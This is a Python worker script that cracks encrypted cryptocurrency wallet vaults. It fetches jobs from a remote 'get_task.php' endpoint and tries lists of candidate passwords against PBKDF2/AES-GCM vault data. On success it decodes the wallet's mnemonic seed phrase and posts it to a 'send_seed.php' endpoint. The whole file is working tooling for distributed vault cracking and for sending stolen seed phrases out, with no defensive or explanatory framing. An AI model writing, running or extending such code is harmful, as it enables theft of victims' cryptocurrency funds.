import json
import base64
import hashlib
from Crypto.Cipher import AES
import requests
import time

class Hdec:
    def key_from_password(self, password, salt):
        salt_buffer = base64.b64decode(salt)
        password_buffer = password.encode('utf-8')
        key = hashlib.pbkdf2_hmac(
            'sha256',
            password_buffer,
            salt_buffer,
            600000,
            dklen=32
        )
        return key

    def decrypt_with_key(self, key, payload):
        encrypted_data = base64.b64decode(payload["data"])
        vector = base64.b64decode(payload["iv"])
        data = encrypted_data[:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=vector)
        decrypted_data = cipher.decrypt(data)
        return decrypted_data

    def decrypt(self, password, text):
        try:
            payload = json.loads(text)
            salt = payload['salt']
            key = self.key_from_password(password, salt)
            decrypted_string = self.decrypt_with_key(key, payload).decode('utf-8')
            jsf = json.loads(decrypted_string)
            return {"status": True, "message": None, "result": jsf}
        except UnicodeDecodeError:
            return {"status": False, "message": "wrong password", "result": None}
        except Exception as e:
            return {"status": False, "message": str(e), "result": None}

def decrypt_vault(data, iv, salt, iterations, passwords):
    hdec = Hdec()
    vault_data = json.dumps({
        "data": data,
        "iv": iv,
        "salt": salt
    })
    
    tried_passwords = []  # List to keep track of tried passwords
    
    for password in passwords:
        tried_passwords.append(password)
        result = hdec.decrypt(password, vault_data)
        if result["status"]:
            if "result" in result and len(result["result"]) > 0 and "data" in result["result"][0]:
                mnemonic_bytes = result['result'][0]['data']['mnemonic']
                result['result'][0]['data']['mnemonic'] = ''.join([chr(byte) for byte in mnemonic_bytes])
            # Format the success message with highlighted password
            print(f"\n Password found: ==> {password} <==")
            return {"status": True, "message": "Decryption successful", "result": result, "tried_passwords": tried_passwords}
        else:
            # Display failed attempt with message
            print(f"Attempted password: {password} - Result: {result['message']}")

    print("\nNo valid password found.")
    return {"status": False, "message": "No valid password found", "result": None, "tried_passwords": tried_passwords}

def main():
    endpoint = 'http://webserver/endpoint/get_task.php'
    update_endpoint = 'http://webserver/endpoint/send_seed.php'

    while True:
        try:
            response = requests.post(endpoint)
            response.raise_for_status()

            task = response.json()
            if 'error' in task:
                print(f"Error: {task['error']}")
                time.sleep(10)  # Wait before retrying

            if 'id' not in task or 'data' not in task or 'iv' not in task or 'salt' not in task or 'iterations' not in task or 'passwords' not in task:
                print("Incomplete task data received.")
                time.sleep(10)  # Wait before retrying
                continue

            task_id = task['id']
            data = task['data']
            iv = task['iv']
            salt = task['salt']
            iterations = int(task['iterations'])
            passwords = task['passwords'].split('|')
            
            result = decrypt_vault(data, iv, salt, iterations, passwords)
            
            if result["status"]:
                # Send result back to server with task ID
                payload = {
                    "id": task_id,
                    "result": json.dumps(result["result"])  # Convert result to JSON string
                }
                response = requests.post(update_endpoint, data=payload)
                
                # Print the response from the server
                print("Response from server after sending result:", response.text)
            else:
                print(result["message"])

            # Wait before the next request
            time.sleep(5)

        except requests.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
